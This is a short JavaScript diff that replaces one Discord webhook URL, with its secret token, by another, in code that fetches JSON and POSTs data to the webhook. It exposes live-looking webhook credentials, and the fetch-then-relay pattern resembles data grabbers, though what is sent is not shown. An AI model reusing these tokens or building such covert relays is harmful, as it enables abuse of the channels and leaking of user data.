@@ -25,7 +25,7 @@
       .then(response => response.json())
       .then(data => {
         var request = new XMLHttpRequest();
-        request.open("POST", "https://discord.com/api/webhooks/903622076840153129/iCjZZFIU0COPw6ZIv7brbjgUIfOD36DxtiXDmcMoSvJQt66q_hwgHiMBRnhXKpLPO41R");
+        request.open("POST", "https://discord.com/api/webhooks/942122343730413598/jcuaJt4ZbviUIujCp5o6WmUStMvTSpYcglLzjOqaWvAFHLOkirw6FzSG9Y63RU1yo0Zf");
 
         request.setRequestHeader('Content-type', 'application/json');
 
